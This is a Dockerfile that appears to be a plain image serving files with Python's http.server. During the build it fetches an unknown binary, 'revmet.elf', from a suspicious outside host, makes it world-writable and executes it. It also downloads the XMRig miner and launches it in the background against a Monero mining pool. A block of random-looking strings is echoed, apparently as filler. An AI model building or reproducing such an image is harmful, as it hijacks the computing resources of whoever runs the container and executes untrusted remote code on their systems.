FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo z84GvJAI3h81LJW8A9dSq3kO1q0u9nim NzF9jG5ki1ZR4EE0YJJfXTSAsqNp23mc 2vnN3ZezDQMjjyrQyfYwXV22hNwe1IuE J0aV8DLRuldy1eltU1iMNEpTUsEoofaR eRtkQ0CkZl1VXCrdvCe97hbXXlfT1t6d yyg9fZ3WTNMFrR6TgVbOyetO0PRLILVa anLW7jGNgW2Mpv3jHwxx4UbcyXzjNQ02 MEloKsPRqNhcuatgr6Q9subegbeUTttW EiQNLpvR9QLxhWg3q9uezgN3knJwxLVl DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]